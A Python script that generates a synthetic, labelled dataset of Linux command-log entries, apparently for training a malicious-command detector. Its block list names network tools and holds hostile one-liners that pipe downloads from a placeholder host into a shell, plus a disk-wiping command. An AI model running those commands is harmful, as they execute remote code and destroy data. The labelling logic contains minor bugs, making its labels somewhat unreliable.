import csv
import random
import datetime

# List of all possible Linux commands
commands = ['ls', 'cd', 'pwd', 'mkdir', 'touch', 'grep', 'awk', 'sed', 'cat', 'cp', 'mv', 'rm', 'top', 'ps', 'kill', 'ping', 'traceroute', 'curl', 'wget', 'scp', 'ssh', 'nmap', 'netcat', 'telnet']

# List of known malicious commands
malicious_commands = ['rm -rf', 'dd', 'mkfs', 'fdisk', 'fsck', 'iptables', 'passwd', 'sudo', 'su', 'chown', 'chmod', 'chgrp', 'shred', 'halt', 'reboot', 'poweroff', 'shutdown', 'systemctl', 'init', 'killall', 'pkill', 'kill', 'crontab', 'at', 'curl', 'wget', 'nc', 'tcpdump', 'nmap', 'telnet', 'ssh', 'scp', 'nmap','curl http://malicious-site.com | sh','cat /dev/urandom > /dev/sda','chmod 777','wget -O- http://malicious-site.com | bash']

# Generate 5000 datasets
datasets = []
for i in range(5000):
    # Generate random datetime between 2020-01-01 and 2023-03-10
    random_date = datetime.datetime.fromtimestamp(random.randint(1577836800, 1646860799))
    # Generate random IP address
    ip_address = '127.0.0.1' if random.random() < 0.5 else f'192.168.{random.randint(0, 255)}.{random.randint(0, 255)}'
    # Generate random command from the list of possible commands
    command = random.choices(commands, weights=[3, 3, 3, 3, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1])[0]
    # Add sudo to the command randomly
    if random.random() < 0.2:
        command = f"sudo {command}"
    # Set not_local to True if the IP address is not localhost
    not_local = ip_address != '127.0.0.1'
    # Set offtime to True if the timestamp is not between 9am and 5pm
    offtime = random_date.hour < 9 or random_date.hour > 17
    # Set has_malicious_command to True if the command is in the list of known malicious commands
    has_malicious_command = command in malicious_commands
    # Set is_malicious to True if any of the following conditions are True:
    # - has_malicious_command is True
    # - has_malicious_command is True and offtime is True
    # - offtime is True and not_local is True
    is_malicious = False
    if has_malicious_command:
        is_malicious = True
    elif offtime and not_local:
        is_malicious = True
    elif has_malicious_command and offtime:
        is_malicious = True
    # Create dataset list
    dataset = [str(random_date), ip_address, command, not_local, offtime, has_malicious_command, is_malicious]
    # Add dataset to the list of datasets
    datasets.append(dataset)


# Write datasets to CSV file
with open('Randomdata.csv', mode='w', newline='') as csv_file:
    fieldnames = ['timestamp', 'ip_address', 'command', 'not_local', 'offtime', 'has_malicious_command', 'is_malicious']
    writer = csv.writer(csv_file)
    writer.writerow(fieldnames)
    writer.writerows(datasets)
print("[+] 5000 data set created. Edit the code to create more if you want.")
